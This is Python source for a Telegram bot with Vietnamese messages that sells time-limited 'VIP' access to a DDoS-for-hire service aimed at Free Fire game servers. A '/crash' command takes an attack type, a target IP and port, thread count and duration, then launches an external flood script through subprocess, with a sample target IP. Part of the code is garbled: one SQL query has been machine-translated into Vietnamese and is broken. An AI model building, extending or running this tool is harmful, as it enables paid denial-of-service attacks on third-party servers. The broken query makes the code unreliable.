bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ Gói Vip Của Bạn Đã Hết Hạn"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"✅ Người Dùng Vip\n"
                f"⏳ Số ngày còn lại: {dias_restantes} ngày(s)\n"
                f"📅 Ngày hết hạn: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "❌Bạn Không Có Gói Vip Nào Đang Hoạt Động"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="💻 Người bán - Chính thức 💻",
        url=f"tg://user?id={ADMIN_ID}"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "🤖CHÀO MỪNG ĐẾN VỚI CRASH BOT [Free Fire]!"
            

            f"""
```
{vip_status}```\n"""
            "📌 *Cách sử dụng:*"
            """
```
/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
            "💡 *Ví dụ:*"
            """
```
/crash UDP 143.92.125.230:10013 10 900```\n"""
            "💠 NGƯỜI DÙNG VIP 💠"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Bạn không phải là người bán được ủy quyền.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Định dạng không hợp lệ. Sử dụng: `/vip <ID> <BAO NHIÊU NGÀY>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"✅ Người dùng {telegram_id} đã được thêm làm VIP trong {days} ngày.")


@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "CHỌN ngày hết hạn TỪ vip_users NƠI telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ Bạn không có quyền sử dụng lệnh này.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "❌ Quyền truy cập VIP của bạn đã hết hạn")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "❌ Chờ 10 giây trước khi bắt đầu đòn tấn công tiếp theo và nhớ dừng đòn tấn công trước đó.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Định dạng không hợp lệ!*\n\n"
                "📌 *Cách sử dụng đúng:*\n"
                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                "💡 *Ví dụ:*\n"
                "`/crash UDP 143.92.125.230:10013 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ Dừng tấn công", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[✅] ĐÃ BẮT ĐẦU TẤN CÔNG - 200 [✅]*\n\n"
            f"🌐 *Cảng:* {ip_port}\n"
            f"⚙️ *Kiểu:* {attack_type}\n"
            f"🧟‍♀️ *Chủ đề:* {threads}\n"
            f"⏳ *Thời gian (ms):* {duration}\n\n"
            f"💠 NGƯỜI DÙNG VIP 💠"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ Chỉ có người dùng bắt đầu cuộc tấn công mới có thể dừng nó"
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ Đòn tấn công đã bị đỡ thành công.")
        bot.edit_message_text(
            "*[⛔] KẾT THÚC CUỘC TẤN CÔNG[⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ Không tìm thấy đòn tấn công nào, vui lòng tiếp tục hành động của bạn.")

if __name__ == "__main__":
    bot.infinity_polling()
  
